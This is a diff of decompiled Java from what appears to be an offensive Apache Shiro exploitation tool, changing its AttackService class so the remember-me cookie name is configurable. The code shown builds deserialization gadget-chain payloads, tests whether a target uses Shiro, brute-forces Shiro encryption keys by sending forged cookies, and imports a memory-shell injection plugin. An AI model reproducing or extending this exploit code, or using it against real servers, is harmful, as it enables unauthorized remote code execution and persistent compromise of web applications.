@@ -1,9 +1,14 @@
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by Fernflower decompiler)
+//
+
 package com.summersec.attack.core;
 
 import com.summersec.attack.deser.frame.Shiro;
 import com.summersec.attack.deser.payloads.ObjectPayload;
-import com.summersec.attack.deser.plugins.keytest.KeyEcho;
 import com.summersec.attack.deser.plugins.servlet.MemBytes;
+import com.summersec.attack.deser.plugins.keytest.KeyEcho;
 import com.summersec.attack.deser.util.Gadgets;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.UI.MainController;
@@ -176,7 +181,7 @@ public class AttackService {
             ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
             Object template = Gadgets.createTemplatesImpl(echoOpt);
             Object chainObject = gadgetPayload.getObject(template);
-            rememberMe = shiro.sendpayload(chainObject, spcShiroKey);
+            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
         } catch (Exception var9) {
             this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
         }
@@ -210,7 +215,7 @@ public class AttackService {
 
         try {
             HashMap<String, String> header = new HashMap();
-            header.put("Cookie", "rememberMe=1");
+            header.put("Cookie", this.shiroKeyWord + "=1");
             String result = this.headerHttpRequest(header);
             flag = result.contains("=deleteMe");
             if (flag) {
@@ -230,14 +235,13 @@ public class AttackService {
 
     public void keyTestTask(final List<String> shiroKeys) {
         Thread thread = new Thread(new Runnable() {
-            @Override
             public void run() {
                 try {
                     for(int i = 0; i < shiroKeys.size(); ++i) {
                         String shirokey = (String)shiroKeys.get(i);
 
                         try {
-                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, (String)shiroKeys.get(i));
+                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                             HashMap<String, String> header = new HashMap();
                             header.put("Cookie", rememberMe);
                             String result = AttackService.this.headerHttpRequest(header);
